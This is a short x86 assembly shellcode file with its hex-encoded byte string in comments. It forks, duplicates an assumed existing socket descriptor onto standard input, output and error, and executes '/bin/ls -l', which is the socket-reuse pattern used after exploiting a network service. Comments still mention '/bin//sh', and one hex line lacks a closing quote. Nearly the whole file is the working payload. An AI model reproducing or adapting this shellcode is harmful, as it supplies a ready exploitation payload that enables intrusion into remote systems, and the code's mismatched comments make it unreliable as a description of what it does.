# Author: Victor BUSA

.globl main
	.type	main, @function

#"\x6a\x02\x58\xcd\x80\x6a\x08\x5b"
#"\x31\xd2\x31\xc0\x31\xc9\xb1\x02"
#"\xb0\x3f\xcd\x80\x49\x79\xf9\xb0"
#"\x0b\x52\x68\x2f\x2f\x6c\x73\x68"
#"\x2f\x62\x69\x6e\x89\xe3\x52\x68"
#"\x2d\x6c\x20\x20\x89\xe6\x52\x56
#"\x53\x89\xe1\xcd\x80";

main:
push $0x02			# syscall for fork
pop %eax			# value in %eax (push/pop better than mov)
int $0x80			# call fork --> cause %eax = 0


push $0x08			# value of socket = 8
pop %ebx			# put the value of the socket in %ebx

#dup2(socket, i) where i = 0, 1 then 2;
xor %edx, %edx			# %edx to 0
xor %eax, %eax			# %eax to 0
xor %ecx, %ecx
mov $0x2, %cl			# count and %ecx = 2, 1, 0
dup2:
	movb $0x3f, %al	 	# dup2()
	int $0x80 		# call dup2()
	dec %ecx 		# decr %ecx
	jns dup2


#execve("/bin/ls", ["/bin//ls", "-l"], NULL);
mov $11, %al			# execve
push %edx			# Null at the end of the string
push $0x736c2f2f		# "//ls" $0x68732f2f
push $0x6e69622f		# "/bin"
mov %esp, %ebx			# address of "/bin//sh\0" in %ebx

push %edx			# push NULL
push $0x20206c2d		# push "-l  "
mov %esp, %esi			# address of "-l  "

push %edx
push %edx			# push NULL
push %esi			# push addess of "-l  "
push %ebx			# push address of "/bin//sh\0"
mov %esp, %ecx			# argv (2)
int $0x80
